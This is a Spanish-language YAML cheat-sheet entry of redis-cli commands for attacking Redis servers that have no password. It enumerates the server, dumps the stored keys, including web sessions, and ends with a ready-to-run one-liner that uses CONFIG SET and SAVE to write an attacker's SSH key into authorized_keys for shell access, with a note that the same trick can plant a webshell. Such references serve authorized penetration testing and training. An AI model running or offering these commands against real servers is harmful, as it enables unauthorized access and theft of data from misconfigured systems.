# Comandos de redis-cli: leer y abusar de un Redis sin contraseña.
tool: redis-cli
area: otros
url: https://redis.io/docs/latest/develop/tools/cli/
commands:
  - id: redis-info
    title: Comprobar si Redis pide contraseña
    cmd: |
      redis-cli -h {{RHOST}} info server
    phase: enum
    tags: [redis]
    notes: >-
      Si devuelve la versión, el sistema y la ruta del ejecutable, no hay autenticación. NOAUTH
      Authentication required significa que la hay: prueba -a con contraseñas de los archivos de
      configuración que encuentres.
    refs: [https://redis.io/docs/latest/commands/info/]

  - id: redis-dump-keys
    title: Listar y leer las claves guardadas
    cmd: |
      redis-cli -h {{RHOST}} --scan | head -50
    phase: exfil
    tags: [redis]
    notes: >-
      --scan recorre las claves sin bloquear el servidor (KEYS * sí lo bloquea). Lee cada una con GET
      o, si es otro tipo, con TYPE y luego HGETALL, LRANGE o SMEMBERS. Las sesiones de una web viven a
      menudo aquí.
    refs: [https://redis.io/docs/latest/commands/scan/]

  - id: redis-ssh-key
    title: Escribir tu clave SSH en el servidor desde Redis
    cmd: |
      (printf '\n\n'; cat p3i.pub; printf '\n\n') | redis-cli -h {{RHOST}} -x set p3i && redis-cli -h {{RHOST}} config set dir /var/lib/redis/.ssh && redis-cli -h {{RHOST}} config set dbfilename authorized_keys && redis-cli -h {{RHOST}} save
    phase: initial-access
    tags: [redis, ssh]
    notes: >-
      CONFIG SET cambia dónde vuelca Redis su base de datos: el volcado con tu clave dentro acaba como
      authorized_keys del usuario de Redis (o de root, si corre como root y apuntas a /root/.ssh).
      Luego ssh -i p3i redis@objetivo. Con una web en el mismo host, igual con una webshell.
    refs: [https://redis.io/docs/latest/commands/config-set/]
